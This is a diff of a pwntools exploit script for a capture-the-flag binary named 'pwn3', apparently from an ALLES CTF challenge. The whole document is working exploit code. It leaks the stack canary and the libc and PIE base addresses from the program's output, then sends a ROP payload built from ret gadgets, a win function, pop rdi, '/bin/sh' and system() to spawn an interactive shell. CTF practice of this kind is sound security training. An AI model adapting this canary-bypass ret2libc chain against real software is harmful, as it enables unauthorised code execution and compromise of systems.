@@ -15,10 +15,10 @@ def fuzz(pwd=""):
 
 
 libc_offset = 0x1eb723
-pie_offset = 0x1570 
+pie_offset = 0x1570 #0x1d90
 ret_offset = 0x1525
 main_offset = 0x1526
-
+win_offset = 0x1333
 pop_rdi_offset = 0x015d3
 
 binsh_offset = 0x1b6613
@@ -32,6 +32,7 @@ pad = cyclic(0xff+0xf)
 
 
 #p = remote("hax1.allesctf.net",9102)
+#p = remote("172.17.0.2",1024)
 p = process("./pwn3")
 
 print(p.recvline())
@@ -43,13 +44,16 @@ tmp = p.recvuntil("spell:")
 print(tmp)
 
 canary = int(tmp.split()[-7],16)
+#libc addr
 libc_base = int(tmp.split()[-8],16) - libc_offset
 system = libc_base + system_offset
 bin_sh = libc_base + binsh_offset
 exit = libc_base + exit_offset
+#pie addr
 pie_base = int(tmp.split()[-6],16) - pie_offset
 ret = pie_base + ret_offset
 pop_rdi = pie_base + pop_rdi_offset
+win = pie_base + win_offset
 RBP = "BBBBBBBB"
 
 log.info("Stack Canary: {}".format(hex(canary)))
@@ -62,5 +66,23 @@ log.info("AAAAAAAA_ret operation: {}".format(hex(ret)))
 
 raw_input("Exploit ?")
 idx = cyclic_find("cnaacoaa")
-p.sendline(spell+pad[:idx]+p64(canary)+p64(exit)+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system))
+
+payload = ""
+payload+= spell
+payload+= pad[:idx]
+payload+= p64(canary)
+payload+= RBP
+payload+= p64(ret)
+payload+= p64(ret)
+payload+= p64(ret)
+payload+= p64(ret)
+payload+= p64(win)
+payload+= p64(pop_rdi)
+payload+= p64(bin_sh)
+payload+= p64(system)
+#payload+= p64(pop_rdi)
+#payload+= p64(0)
+#payload+= p64(exit)
+
+p.sendline(payload)
 p.interactive()
